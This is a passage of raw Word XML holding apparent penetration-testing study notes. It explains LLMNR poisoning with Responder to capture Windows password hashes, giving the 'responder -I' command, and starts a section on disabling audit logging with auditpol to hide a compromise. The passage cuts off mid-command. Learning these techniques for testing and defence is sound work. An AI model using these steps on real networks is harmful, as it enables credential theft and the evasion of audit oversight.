          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000219">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">USING OF RESPONDER TO CRACK GATHER PASSWORD FROM THE VICTIM MACHINE:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">SO AS WE KNOW THAT WHENEVER WE CREATE A PASSWORD IN A WINDOWS SYSTEM IT AUTOMATICALLY GETS CONVERTED INTO A HASHED VALUE WHICH IS AN ALMOST UNRECOGNISABLE STRING OF CHARACTERS OF A FIXED LENGTH AND ALSO IT IS IRREVERSIBLE.SO IF WE CAN GO TO THE SAM FILE OF WINDOWS WE CAN ONLY GATHER THE HASHED VALUE OF PASSWORDS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW THERE IS A TERM CALLED LLMNR WHICH STANDS FOR LINK LOCAL MULTICAST NAME RESOLUTION WHERE IF A SPECIFIC HOST IS TRYING TO FIND A FILE/DOCUMENTS/INFORMATION OR A HOST IT CAN TAKE THE HELP OF OTHER ACTIVE HOSTS IF THE DNS FAILES TO DO SO.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000021F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">FOR EXAMPLE 👍</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000220">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000221">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">THE HOST ASKS FOR THE FILE “pintserver” instead of </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000222">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">“Print server” …..so definitely the main server will fail to do so. BUT BY USING LLMNR broadcast the “attacker” who already gets into the LAN imitates as a host in the network and it can check and have a look on all these things by using “RESPONDER”...IT QUICKLY TELLS THE VICTIM THAT I HAVE ACCESS TO “pintserver” please pass me your hash. THIS IS CALLED LLMNR POISONING ATTACK WHERE BY USING THIS PRIVILEGE WE CAN GET THE INITIAL ACCESS TO THE SYSTEM.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000223">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000224">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000225">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="3581400"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="19" name="image35.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image35.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">The command : responder -I [NETWORK NAME]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000227">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW IT WILL TRACK ALL THE ACTIVITIES VIA THE LOCAL NETWORK WE ARE CONNECTED WITH.HERE IT IS [eth0]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000228">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000229">
      <w:pPr>
        <w:rPr>
          <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Here the attacker </w:t>
      </w:r>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve">gets the information that the victim machine had failed to retrieve a specific information from DNS . now the attacker has a golden opportunity to get the HASH of the victim by using LLMNR protocol.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022A">
      <w:pPr>
        <w:rPr>
          <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022B">
      <w:pPr>
        <w:rPr>
          <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022C">
      <w:pPr>
        <w:rPr>
          <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
              <wp:extent cx="5731200" cy="3276600"/>
              <wp:effectExtent b="0" l="0" r="0" t="0"/>
              <wp:docPr id="80" name="image80.png"/>
              <a:graphic>
                <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:pic>
                    <pic:nvPicPr>
                      <pic:cNvPr id="0" name="image80.png"/>
                      <pic:cNvPicPr preferRelativeResize="0"/>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId103"/>
                      <a:srcRect b="0" l="0" r="0" t="0"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5731200" cy="3276600"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve">Now we can </w:t>
        </w:r>
      </w:ins>
      <w:del w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:author="Swakshar Chatterjee" w:id="0" w:date="2024-08-03T17:41:30Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve">see that the responder is in listening mod</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000022F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">HOW TO CLEAR LOGS TO HID THE EVIDENCE OF COMPREMISE:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000230">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000231">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1.USING AUDITPOL:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000232">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000233">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">In order to hide the clearing and auditing logs of our system we should use the auditpol command:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000234">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000235">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We need to go the command prompt and run as administrator:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000236">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000237">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000238">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000239">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">auditpol/get/category:*</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">auditpol/set/category:”system”,”account </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
